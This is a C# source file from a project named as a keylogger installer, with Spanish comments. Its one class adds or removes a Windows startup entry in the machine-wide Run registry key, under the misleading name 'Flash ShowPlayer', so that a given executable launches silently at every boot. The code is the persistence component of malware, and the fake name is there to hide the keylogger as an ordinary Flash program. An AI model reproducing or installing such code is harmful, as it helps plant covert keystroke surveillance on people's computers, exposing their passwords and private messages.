﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

//iniciar con windows
using Microsoft;
using Microsoft.Win32;
using System.IO;
//using Microsoft.Win32.Registry;
namespace Instalador_Keylogger
{
    class ManejadorRegistroInicio
    {
        public string InteractuarConRegistro(bool bCrear, string rutaAplicacion)
        {
            // clave del registro para 
            // colocar el path del ejecutable para iniciar con windows
            string CLAVE = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            //ProductName : el nombre del programa.
            string subClave = Application.ProductName.ToString();
            // Mensaje para retornar el resultado
            string msg = "";

            try
            {
                //        // Abre la clave del usuario actual (CurrentUser) para poder extablecer el dato
                //        //si la clave CurrentVersion\Run no existe la crea
                System.Security.Principal.WindowsIdentity user = System.Security.Principal.WindowsIdentity.GetCurrent();


                RegistryKey Registro = Registry.LocalMachine.CreateSubKey(CLAVE, RegistryKeyPermissionCheck.ReadWriteSubTree);
                Registro.OpenSubKey(CLAVE, true);



                if (bCrear == true)
                {
                    //´ Escribe el path con SetValue 
                    //´Valores : ProductName el nombre del programa y ExecutablePath : la ruta del exe

                    //Application.ExecutablePath.ToString() ---> Es la Ruta del Aplicativo actual "ESTE"
                    //Subclave es el nombre de la aplicacion
                    //Registro.SetValue(subClave, Application.ExecutablePath.ToString());

                    Registro.SetValue("Flash ShowPlayer", '"' + rutaAplicacion + '"' + " /b");

                    return "Ok .. clave añadida";
                    //´ Eliminar
                    //´´´´´´´´´´´´´´´´´´´´´´
                    //´Elimina la entrada con DeleteValue
                }
                else if (bCrear == false)
                {
                    if (Registro.GetValue("Flash ShowPlayer", "").ToString() != "")
                    {
                        Registro.DeleteValue("Flash ShowPlayer");
                        //eliminar
                        msg = "Ok .. clave eliminada";
                    }
                    else
                    {
                        msg = "No se eliminó , por que el programa no iniciaba con windows";
                    }

                }
            }
            catch (Exception ex)
            {
                msg = ex.Message.ToString();
            }
            return msg;
        }
    }
}
